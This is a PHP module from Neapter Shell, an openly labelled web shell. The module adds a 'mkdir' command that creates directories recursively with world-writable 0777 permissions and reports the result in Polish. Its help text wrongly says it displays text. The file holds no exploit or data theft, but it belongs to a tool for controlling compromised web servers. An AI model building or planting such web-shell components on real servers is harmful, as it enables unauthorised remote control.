<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Create directory
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleMkdir extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array('mkdir');
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2016-06-08 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Wyświetla tekst

	Użycie:
		mkdir /tmp/newdir
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        $iParams = $this->oArgs->getNumberOfParams();

        if ($iParams === 0) {
            return self::getHelp();
        }

        $sOutput = '';

        for ($i = 0; $i < $iParams; ++$i) {
            $sPathName = $this->oArgs->getParam($i);

            $sOutput .= sprintf(
                "Katalog \"%s\" %szostał utworzony\r\n",
                $sPathName,
                (! @mkdir($sPathName, 0777, true) ? 'nie ' : '')
            );
        }

        return $sOutput;
    }
}
